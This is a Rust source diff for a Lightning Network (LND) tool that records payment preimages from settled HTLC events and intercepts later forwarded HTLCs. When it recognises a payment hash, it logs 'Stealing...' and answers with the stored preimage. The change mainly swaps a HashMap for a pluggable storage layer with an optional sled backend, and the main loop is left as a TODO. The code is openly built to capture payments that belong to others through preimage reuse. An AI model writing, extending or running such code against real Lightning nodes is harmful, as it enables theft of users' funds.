@@ -1,14 +1,20 @@
 // This program accepts four arguments: host, port, cert file, macaroon file
 
+mod memory;
+#[cfg(feature = "sled")]
+mod sled;
 mod storage;
 
-use std::collections::HashMap;
 use std::sync::Arc;
 
+#[cfg(feature = "sled")]
+use crate::sled::SledStorage;
 use sha2::Digest;
 use sha2::Sha256;
 use tokio::sync::Mutex;
 use tokio::task::spawn;
+use crate::memory::MemoryStorage;
+use crate::storage::Storage;
 
 #[tokio::main]
 async fn main() {
@@ -53,13 +59,15 @@ async fn main() {
     // the response to get the message.
     println!("{:#?}", info.alias);
 
+    let storage = MemoryStorage::new();
+
     // hashmap storing preimages and their hashes
-    let hash_map: Arc<Mutex<HashMap<Vec<u8>, Vec<u8>>>> = Arc::new(Mutex::new(HashMap::new()));
+    let storage: Arc<Mutex<MemoryStorage>> = Arc::new(Mutex::new(storage));
 
     // HTLC event stream part
     println!("starting htlc event subscription");
     let mut client_router_htlc_event = client_router.clone();
-    let hash_map_htlc_event = hash_map.clone();
+    let storage_htlc_event = storage.clone();
     spawn(async move {
         let mut htlc_event_stream = client_router_htlc_event
             .subscribe_htlc_events(tonic_openssl_lnd::routerrpc::SubscribeHtlcEventsRequest {})
@@ -86,11 +94,11 @@ async fn main() {
                         hex::encode(payment_hash)
                     );
 
-                    let _already_inserted = hash_map_htlc_event
+                    let _already_inserted = storage_htlc_event
                         .clone()
                         .lock()
                         .await
-                        .insert(payment_hash.to_vec(), settle_event.preimage);
+                        .set(settle_event.preimage, payment_hash.to_vec());
                     ()
                 };
             }
@@ -121,8 +129,8 @@ async fn main() {
         {
             println!("htlc {:?}", htlc);
 
-            let map = hash_map.lock().await;
-            let response = match map.get(&htlc.payment_hash) {
+            let map = storage.lock().await;
+            let response = match map.get(htlc.payment_hash) {
                 Some(preimage) => {
                     println!("HTLC preimage saved! Stealing...");
                     tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
@@ -153,4 +161,15 @@ async fn main() {
 
     // TODO
     loop {}
+}
+
+#[cfg(feature = "sled")]
+fn parse_sled_config(mut args: std::env::ArgsOs) -> SledStorage {
+    match args.next() {
+        Some(arg) => {
+            let str = arg.into_string().expect("Failed to parse sled config arg");
+            SledStorage::new(str.as_str()).expect("Failed to create sled storage")
+        }
+        None => SledStorage::default(),
+    }
 }
